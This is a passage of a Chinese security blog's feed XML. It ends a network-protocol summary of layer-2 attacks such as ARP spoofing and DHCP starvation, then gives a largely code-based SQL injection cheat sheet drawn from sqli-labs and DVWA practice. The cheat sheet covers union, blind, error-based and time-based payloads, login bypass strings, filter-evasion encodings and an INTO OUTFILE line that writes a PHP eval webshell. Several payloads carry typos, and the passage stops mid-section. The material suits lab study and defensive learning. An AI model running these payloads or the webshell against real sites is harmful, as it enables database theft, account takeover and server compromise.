地址在周期时间内未更新，则删除</li></ul></li><li>转发：截取数据帧中的目的 MAC 地址，与 CAM 表中的 MAC 地址匹配<ul><li>找到匹配地址，则获取对应端口号，然后将数据帧转发到对应端口号</li><li>未找到匹配地址，则将数据帧进行广播处理，转发到交换机的所有端口</li></ul></li><li>结束</li></ol></li></ul><blockquote><p>MAC 表和 CAM 表所其作用的环境不同，MAC 表是全局表，一般通过全局 CPU 进程转发需要查看 MAC 表，但是，现在基本都是硬件快速转发，那么这个时候就生成了CAM表，它其实是从MAC表衍生出来的，每个接口都可以有CAM以便快速转发。简而言之，CAM 从 MAC 转变而来，并用于基于硬件的快速转发 </p></blockquote><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li>若 CAM 表被恶意快速填满，则会导致以后转发的数据帧变为广播帧，从而被嗅探监听</li><li>若 CAM 表被恶意快速填满，可能导致某些主机转发数据帧被误导，则导致中间人攻击而不能通信</li></ol><h2 id="生成树协议"><a href="#生成树协议" class="headerlink" title="生成树协议"></a>生成树协议</h2><h3 id="生成树协议的产生"><a href="#生成树协议的产生" class="headerlink" title="生成树协议的产生"></a>生成树协议的产生</h3><ul><li>为了使某一个网络链路出了故障而不影响整个网络，人们引入冗余链路技术</li><li>只要有冗余链路的地方，就会出现环路问题，生成树协议在一定程度上解决了这个问题</li></ul><h3 id="生成树协议的过程"><a href="#生成树协议的过程" class="headerlink" title="生成树协议的过程"></a>生成树协议的过程</h3><ol><li>局域网交换机间互相发送 BPDU 消息进行根网桥的选举，根网桥上的接口都是指定端口</li><li>然后在不是根网桥的交换机上选出一个根端口</li><li>在交换机和交换机相连的链路上，要选举出一个端口作为指定端口，负责将数据帧转发到根网桥上</li><li>有了根端口和指定端口后，其他的端口就是非指定端口，也是最终被阻断的端口，这样就防止了环路</li></ol><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/36.jpg" alt></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol><li>生成树协议完全依赖 BPDU 数据帧信息，缺少认证机制，如果攻击者伪造优先级为 0 的 BPDU 消息，就会使局域网中的交换机将所有分组转发到攻击者的交换机。</li><li>在局域网中发送大量伪造的 BPDU 导致交换机忙于处理 BPDU 消息，从而使交换机处于拒绝服务状态，最终通信中断</li></ol><h2 id="DHCP-协议"><a href="#DHCP-协议" class="headerlink" title="DHCP 协议"></a>DHCP 协议</h2><h3 id="DHCP-工作过程"><a href="#DHCP-工作过程" class="headerlink" title="DHCP 工作过程"></a>DHCP 工作过程</h3><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/29.png" alt></p><ol><li><p>DHCP Discover：新机器刚刚接入网络，什么都没有。新来的机器使用 IP 地址 0.0.0.0 发送一个广播包，广播包封装了 UDP，UDP 封装了 BOOTP。如果网络中存在 DHCP Server，它在收到广播包之后就知道来了个新人，需要 IP 地址，就会返回一个租用信息</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/37.jpg" alt></p></li><li><p>DHCP Offer：通过单播返回的租用信息，包含已分配的 IP 地址</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/38.jpg" alt></p></li><li><p>DHCP Request：广播包，向 DHCP Server 确认 IP 地址没有问题，并告诉其他的 DHCP Server 自己使用的是哪个 DHCP Server 的租约，请求它们撤销提供的 IP。一般使用最先到达的 DHCP Offer</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/39.jpg" alt></p></li><li><p>DHCP ACK：通过广播表明接收客户机的选择，并将租约信息放在广播包中</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/network/40.jpg" alt></p></li></ol><blockquote><p>DHCP 服务器的 offer 与 ack 阶段既可以使用单播的方式又可以使用广播的方式，这主要取决于服务器在 offer 阶段对 BROADCAST 位的置位情况,如果置位为 1，则 DHCP 服务器使用广播的方式回应，否则使用单播的方式回应</p></blockquote><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在客户端上伪造大量源 MAC 地址，然后将含有这些伪造的源 MAC 地址的 DHCP 发现包发送出去，由于 DHCP Server 没有识别能力，就会处理这些 Discover，直至资源被耗尽。此时，攻击者伪造一个 DHCP Server，给局域网的机器发送伪造的配置信息，从而向客户端发起其他攻击</p><h1 id="针对二层交换的攻击"><a href="#针对二层交换的攻击" class="headerlink" title="针对二层交换的攻击"></a>针对二层交换的攻击</h1><h2 id="交换机毒化"><a href="#交换机毒化" class="headerlink" title="交换机毒化"></a>交换机毒化</h2><ul><li>到达交换机的数据帧交给交换机，通过查询 CAM 表进行地址端口核对，如果找到数据帧中的目的 MAC 地址对应的端口则转发，否则交换机就会将数据帧以广播帧形式转发到所有端口</li><li>攻击者使用大量的无效源 MAC 地址、目的 MAC 地址构造虚假的数据帧，向局域网发送，交换机的 CAM 表会被迅速填满。交换机无法处理更多的帧，这时攻击者可以进行嗅探监听</li></ul><h2 id="MAC-地址欺骗"><a href="#MAC-地址欺骗" class="headerlink" title="MAC 地址欺骗"></a>MAC 地址欺骗</h2><ul><li>利用虚假的或攻击者指定的 MAC 地址伪装成网络中其他主机或设备</li><li>交换机发现两个端口对应同一个 MAC 地址而导致混乱，攻击者通过这种方式强制交换机将发送给合法主机的数据帧发送给攻击者</li></ul><h2 id="ARP-欺骗"><a href="#ARP-欺骗" class="headerlink" title="ARP 欺骗"></a>ARP 欺骗</h2><ul><li>攻击者将源 MAC 地址伪装成网络上其他主机的攻击方式。攻击者通过对 ARP 表毒化而进行欺骗</li><li>例如某一 IP 地址是 192.168.0.254，其 MAC 地址为 00-11-22-33-44-55，交换机 ARP 表会有这一条 ARP 记录。攻击者发动攻击时，会大量发出已将 192.168.0.254 的 MAC 地址篡改为 00-55-44-33-22-11 的 ARP 数据包。那么交换机若将此伪造的 ARP 写入自身的 ARP 表后，其他计算机与 192.168.0.254 通信时，数据包将被导到 00-55-44-33-22-11 这个MAC地址，因此攻击者可从此MAC地址截收到数据包，可篡改后再转送(中间人攻击)，也可转送到真正的网关(数据包嗅探监听)</li></ul><h2 id="VLAN-跳转攻击"><a href="#VLAN-跳转攻击" class="headerlink" title="VLAN 跳转攻击"></a>VLAN 跳转攻击</h2><ul><li>在正常情况下，不同 VLAN 间的通信，需要利用一个三层设备在不同 VLAN 间进行数据传输</li><li>VLAN 跳转攻击是指攻击者企图绕过三层设备，直接从一个 VLAN 向另一个 VLAN 建立通信，并对另一个 VLAN 的设备进行入侵</li></ul><h2 id="STP-协议攻击"><a href="#STP-协议攻击" class="headerlink" title="STP 协议攻击"></a>STP 协议攻击</h2><ul><li>攻击者通过广播伪造的 BPDU 来夺取根网桥的身份</li></ul><h2 id="DHCP-欺骗与耗尽"><a href="#DHCP-欺骗与耗尽" class="headerlink" title="DHCP 欺骗与耗尽"></a>DHCP 欺骗与耗尽</h2><ul><li>攻击者通过泛洪大量伪造的 DHCP Discover，来使 DHCP Server 资源耗尽，从而使局域网中的合法客户端无法联网</li><li>攻击者伪造 DHCP Server，给局域网的机器发送伪造的配置信息，从而向客户端发起其他攻击</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前导篇&quot;&gt;&lt;a href=&quot;#前导篇&quot; class=&quot;headerlink&quot; title=&quot;前导篇&quot;&gt;&lt;/a&gt;前导篇&lt;/h1&gt;&lt;h2 id=&quot;以太网和以太网帧&quot;&gt;&lt;a href=&quot;#以太网和以太网帧&quot; class=&quot;headerlink&quot; title=&quot;以太网和以
      
    
    </summary>
    
      <category term="总结" scheme="http://yoursite.com/categories/%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="总结" scheme="http://yoursite.com/tags/%E6%80%BB%E7%BB%93/"/>
    
      <category term="计算机网络" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>SQL 注入</title>
    <link href="http://yoursite.com/2019/06/10/SQL%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://yoursite.com/2019/06/10/SQL注入总结/</id>
    <published>2019-06-10T01:58:16.107Z</published>
    <updated>2019-06-10T04:46:48.594Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h1><h2 id="sqli-labs和dvwa"><a href="#sqli-labs和dvwa" class="headerlink" title="sqli-labs和dvwa"></a>sqli-labs和dvwa</h2><p>在用火狐时发现一个问题，在浏览器的URL栏输入 # 时，会把 # 后面的都注释掉，比如，127.0.0.1/index.php?id=1#qwerasdf，通过抓包发现请求的是127.0.0.1/index.php?id=1</p><p>由此得到结论，# 对于浏览器就是注释的意思。这也就解释了sqli-labs中在有些关卡在URL中输入 # 无效但是 %23 有效的状况</p><p>同样的在 Less-25 中，过滤了 and 和 or ，如果直接使用 &amp;&amp; ，是会报错的，应用 %26%26</p><p>在 dvwa 的注入中，在提交 id 时会对提交内容进行一次 URLencode，所以在那个框框里面输入 1’ %23 是无法起到注释作用的，通过抓包发现其请求的是 ?id=1’%2523，其中 %25 是 % 的URL编码。在sqli-labs的 POST 注入中也会出现上述情况。</p><h2 id="一些闭合方式"><a href="#一些闭合方式" class="headerlink" title="一些闭合方式"></a>一些闭合方式</h2><p>‘$id’，”$id”，(‘$id’)，(“$id”)，{“$id”}，{‘$id’}</p><h1 id="GET型注入"><a href="#GET型注入" class="headerlink" title="GET型注入"></a>GET型注入</h1><h2 id="判断类型"><a href="#判断类型" class="headerlink" title="判断类型"></a>判断类型</h2><p>字符型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">//报错信息 &apos;1&apos;&apos; LIMIT 0,1 </span><br><span class="line">//有三个 &apos; ，猜 MySQL 语句 select * from table where id=&apos;$id&apos; </span><br><span class="line">near &apos;&apos;1&apos;&apos; LIMIT 0,1&apos; at line 1 </span><br><span class="line">?id=1&apos;%23 //返回正常</span><br></pre></td></tr></table></figure><p>数字型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; </span><br><span class="line">//报错信息 &apos; LIMIT 0,1 </span><br><span class="line">//有一个 &apos; ，猜 MySQL 语句 select * from table where id=$id </span><br><span class="line">near &apos;&apos; LIMIT 0,1&apos; at line 1 </span><br><span class="line">?id=1+1 //返回正常</span><br></pre></td></tr></table></figure><h2 id="判断查询字段数"><a href="#判断查询字段数" class="headerlink" title="判断查询字段数"></a>判断查询字段数</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union slect 1,2,3 %23  </span><br><span class="line">?id=1&apos; order by 3 %23  </span><br><span class="line">//返回正确，说明MySQL为select column1,column2,column3 from table where id=&apos;$id&apos;</span><br></pre></td></tr></table></figure><h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//当前数据库 </span><br><span class="line">?id=1&apos; uinon select databse(),2,3 %23 </span><br><span class="line">//所有数据库 </span><br><span class="line">?id=1&apos; union select 1,select schema_name from INFORMATION_SCHEMA.schemata,3 %23</span><br></pre></td></tr></table></figure><h2 id="数据表"><a href="#数据表" class="headerlink" title="数据表"></a>数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select table_name from information_schema.tables where table_schema=&apos;xxx&apos;,3 %23</span><br></pre></td></tr></table></figure><h2 id="数据列"><a href="#数据列" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select column_name from information_schema.columns where table_name=&apos;xxx&apos;,3 %23</span><br></pre></td></tr></table></figure><h2 id="数据内容"><a href="#数据内容" class="headerlink" title="数据内容"></a>数据内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select 1,select xxx from xxx,3 %23</span><br></pre></td></tr></table></figure><h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><p>一般布尔盲注中只会出现返回成功和返回失败的界面，不会有union联合查询的。</p><p>盲注分为布尔型，时间型和报错型。</p><p>首先判断注入类型，和以前相同，要注意二分法的应用。</p><h2 id="数据库名称长度"><a href="#数据库名称长度" class="headerlink" title="数据库名称长度"></a>数据库名称长度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//用二分法判断范围 </span><br><span class="line">?id=1&apos; and length(database())=8 %23  //返回正确，说明数据库名称长度为8</span><br></pre></td></tr></table></figure><h2 id="数据库名称内容"><a href="#数据库名称内容" class="headerlink" title="数据库名称内容"></a>数据库名称内容</h2><p><strong>left判断</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and left(database(),1)=&apos;s&apos; %23 ?id=1&apos; and left(database(),2)=&apos;se&apos; %23 ?id=1&apos; and left(database(),8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure><p><strong>substr判断</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ascii(substr(database(),1,1))=83 %23 ?id=1&apos; and ascii(substr(database(),2,1))=69 %23 ?id=1&apos; and substr(database(),1,8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure><p><strong>regexp判断</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and 1=(database() regexp &apos;^[a-z]&apos;) %23 ?id=1&apos; and 1=(database() regexp &apos;^s[a-z]&apos;) %23 ?id=1&apos; and 1=(database()=&apos;security&apos;) %23</span><br></pre></td></tr></table></figure><p><strong>mid判断</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and ord(mid(database(),1,1))=83 %23 ?id=1&apos; and ord(mid(database(),2,1))=69 %23 ?id=1&apos; and mid(database(),1,8)=&apos;security&apos; %23</span><br></pre></td></tr></table></figure><h2 id="数据表-1"><a href="#数据表-1" class="headerlink" title="数据表"></a>数据表</h2><p>先用length()判断长度</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and length(select table_name from information_schema.tables where table_schema=database() limit 0,1)=5 %23</span><br></pre></td></tr></table></figure><p>然后判断内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//left判断前两位 </span><br><span class="line">?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)=&apos;e&apos; %23 ?id=1&apos; and left((select table_name from information_schema.tables where table_schema=database() limit 0,1),2)=&apos;em&apos; %23 </span><br><span class="line">//substr判断第三位 </span><br><span class="line">?id=1&apos; and substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),3,1)=&apos;a&apos; %23 </span><br><span class="line">//regexp判断第四位 </span><br><span class="line">?id=1&apos; and 1=(select 1 from information_schema.tables where table_schema=database() and table_name regexp &apos;^emai[a-z]&apos; limit 0,1) %23 </span><br><span class="line">//mid判断第五位 </span><br><span class="line">?id=1&apos; and mid((seanlect table_name from information_schema.tables where table_schema=database() limit 0,1),4,1)=&apos;l&apos; %23</span><br></pre></td></tr></table></figure><p>如果想判断第二个表，把 limit 0,1 改为 limit 1,1 即可</p><p>但是regexp中不可以，只要是table_name中的内容，regexp都可以匹配到</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/1.png" alt="img"></p><h2 id="数据列-1"><a href="#数据列-1" class="headerlink" title="数据列"></a>数据列</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select table_name from information_schema.tables where table_schema=database() limit 0,1</span><br></pre></td></tr></table></figure><p>改为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name from information_schema.columns where table_name=&apos;xxxx&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>再进行判断</p><h2 id="数据内容-1"><a href="#数据内容-1" class="headerlink" title="数据内容"></a>数据内容</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//ifnull和cast函数，第一位为D </span><br><span class="line">?id=1&apos; and ord(mid((select ifnull(cast(username as char),0x20) from security.users order by id limit 0,1),1,1))=68 %23 </span><br><span class="line">//普通方式，第二位为u </span><br><span class="line">?id=1&apos; and ascii(substr((select username from security.users order by id limit 0,1),2,1))=85 %23</span><br></pre></td></tr></table></figure><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><p>使用报错注入的前提是，当前页面能够 print_r(mysql_error()) 或者是 echo(mysql_error())</p><p>后面 from 的表必须是存在的，比如 information_schema.tables 或者 information_schema.columns </p><h2 id="Floor报错"><a href="#Floor报错" class="headerlink" title="Floor报错"></a>Floor报错</h2><p>这两种语句都可以，只是第一个知道字段数是3</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//替换 select user() </span><br><span class="line">?id=1&apos; union select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a %23 </span><br><span class="line">//替换 select schema_name frominformation_schema.schemata limit 0,1 </span><br><span class="line">?id=1&apos; and (select 1 from (select count(*),concat(((select schema_name frominformation_schema.schemata limit 0,1)),&apos;;&apos;,floor (rand(0)*2))x frominformation_schema.tables group by x)a) %23</span><br></pre></td></tr></table></figure><p>简化版Floor报错注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from information_schema.tables group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure><p>如果关键的表被禁用了，可以使用这种形式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from (select 1 union select null union select !1)a group by concat(version(),floor(rand(0)*2))</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/2.jpg" alt="img"></p><p>如果 rand 被禁用了可以使用用户变量来报错(实测未成功)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select min(@a:=1) from information_schema.tables group by concat(password,@a:(@a+1)%2)</span><br></pre></td></tr></table></figure><h2 id="Xpath报错"><a href="#Xpath报错" class="headerlink" title="Xpath报错"></a>Xpath报错</h2><p>放一个蓝鲸的题：<a href="http://202.98.3.108:10010/websql/index.php" target="_blank" rel="noopener">http://202.98.3.108:10010/websql/index.php</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//extractvalue </span><br><span class="line">?id=1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) %23 </span><br><span class="line">//updatexml </span><br><span class="line">?id=1&apos; and updatexml(1,concat(0x7e,(select @@version),0x7e),1) %23</span><br></pre></td></tr></table></figure><h1 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h1><h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep()"></a>sleep()</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; and if(ascii(substr(database(),1,1))=115,1,sleep(10))  %23</span><br></pre></td></tr></table></figure><h2 id="benchmark-实测未成功"><a href="#benchmark-实测未成功" class="headerlink" title="benchmark()(实测未成功)"></a>benchmark()(实测未成功)</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos; union select (if(ascii(substr(current,1,1))=113,benchmark(50000000,encode(&apos;MSG&apos;,&apos;by 5 seconds&apos;)),null)),2,3 from (select database() as current) as tb1 %23</span><br></pre></td></tr></table></figure><h1 id="导入导出"><a href="#导入导出" class="headerlink" title="导入导出"></a>导入导出</h1><p>首先判断当前用户是否具有写入权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;)) and (select count(*) from mysql.user)&gt;0 %23  //返回正确，说明有最高权限</span><br></pre></td></tr></table></figure><p>将 select 内容导入文件，这里的 path 必须要是绝对路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select version() into outfile &quot;path&quot; </span><br><span class="line">//version()也可以换成一句话 </span><br><span class="line">select &lt;?php @eval($_post[&quot;a&quot;])?&gt; into outfile &quot;path&quot;</span><br></pre></td></tr></table></figure><p>这里是可以直接 getshell 的</p><h1 id="POST注入"><a href="#POST注入" class="headerlink" title="POST注入"></a>POST注入</h1><p>和 GET 注入类似，只是传输的数据不在 URL 中显示，有时需要抓包。常见于登陆的页面</p><p>最常见的一个，万能密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select username,password from users where username=&apos;$username&apos; and password=&apos;$password&apos; limit 0,1</span><br></pre></td></tr></table></figure><p>提交 username=admin’ #   password=1(任意密码) 即可登陆</p><p>有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里注入(报错注入，布尔盲注，时间盲注，联合查询)</p><h1 id="增删改"><a href="#增删改" class="headerlink" title="增删改"></a>增删改</h1><p>常见于注册(insert)和修改内容(update)的页面，有时需要抓包</p><p>比如修改密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update users set password=&apos;$password&apos; where username=&apos;$username&apos;</span><br></pre></td></tr></table></figure><p>在 password 或者 username 处注入，最常见的用报错注入。有时候闭合方式会发生变换，有时候会对输入进行检测( check )，没有对哪里检测就从哪里报错注入</p><p>这里也会造成二次注入</p><h1 id="HEADER头注入"><a href="#HEADER头注入" class="headerlink" title="HEADER头注入"></a>HEADER头注入</h1><p>抓包修改 header 头部，比如 user-agent，referer，cookie</p><p><strong>sqli-labs Less-18</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//Less-19的 referer 同理，也可以用 floor，updatexml </span><br><span class="line">1&apos; and extractvalue(1,concat(0x7e,(select @@version),0x7e)) and &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/3.png" alt="img"></p><p>我觉得Less-18是要输入正确的 uname 和 pass 的，否则是无法显示 user-agent</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/4.png" alt="img"></p><p><strong>Less-20修改cookie</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=admin1&apos; and extractvalue(1,concat(0x7e,(select @@basedir),0x7e)) #</span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/sql/5.png" alt="img"></p><h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><p>这里是针对 ‘ 和 \ 被过滤的情况，一般采用 addslashes() 和 mysql_real_escape_string() 函数</p><p>两者都是对 ‘ 和 \ 进行了 replace 处理，’ 转化为 &#39; ，\ 转化为 \，但是对数字型注入无效</p><p>绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//GET型 </span><br><span class="line">?id=-1%df%27 union select 1 %23 </span><br><span class="line">//POST型，以万能密码为例，&apos; 转为 utf-16 或者 utf-32 </span><br><span class="line">//此处 �&apos; 的 urlencode 为 %ef%bf%bd%27  </span><br><span class="line">name=�&apos; or 1=1 # &amp;pass=111</span><br></pre></td></tr></table></figure><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>在 SQL 中，用分号( ; )来表示语句的结尾，如果再 ; 结束一个 SQL 语句之后继续构造下一条语句，是会在一起执行的。对比于 union 的查询语句，堆叠注入可以执行任意语句</p><p><a href="https://peri0d.xyz/2019/06/05/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/#%e9%9a%8f%e4%be%bf%e6%b3%a8" target="_blank" rel="noopener">强网杯-随便注</a></p><h1 id="各种绕过"><a href="#各种绕过" class="headerlink" title="各种绕过"></a>各种绕过</h1><h2 id="过滤-和-–"><a href="#过滤-和-–" class="headerlink" title="过滤 # 和 –+"></a>过滤 # 和 –+</h2><p>1、union 联合查询，控制查询结果显示位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&apos; union select 1,user(),&apos;3</span><br></pre></td></tr></table></figure><p>2、利用 or ‘1’=’1 闭合</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 or extractvalue(1,concat(0x7e,(select user()),0x7e)) or &apos;1&apos;=&apos;1</span><br></pre></td></tr></table></figure><p>3、编码绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//url encode </span><br><span class="line"># = %23 </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line"># = %23  </span><br><span class="line">--+ = %2D%2D%2B </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line"># = \u0023  </span><br><span class="line">--+ = \u002d\u002d\u002b </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">--+ = &amp;#45;&amp;#45;&amp;#43;  </span><br><span class="line"># = &amp;#35</span><br></pre></td></tr></table></figure><h2 id="过滤-and-和-or"><a href="#过滤-and-和-or" class="headerlink" title="过滤 and 和 or"></a>过滤 and 和 or</h2><p>1、编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">//大小写 </span><br><span class="line">OrORoRAND </span><br><span class="line"></span><br><span class="line">//hex </span><br><span class="line">and = %61%6E%64  </span><br><span class="line">or = %6F%72 </span><br><span class="line"></span><br><span class="line">//unicode </span><br><span class="line">and = \u0061\u006e\u0064  </span><br><span class="line">or = \u006f\u0072 </span><br><span class="line"></span><br><span class="line">//html encode </span><br><span class="line">and = &amp;#97;&amp;#110;&amp;#100;       </span><br><span class="line">or = &amp;#111;&amp;#114;</span><br></pre></td></tr></table></figure><p>2、替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and = &amp;&amp; </span><br><span class="line">or = ||  </span><br><span class="line">//在 URL 栏中 &amp;&amp; 要换 %26%26</span><br></pre></td></tr></table></figure><h2 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h2><p>1、特殊字符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%a0新建一行 </span><br><span class="line">%0b TAB垂直 </span><br><span class="line">/**/ 注释</span><br></pre></td></tr></table></figure><p>2、编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 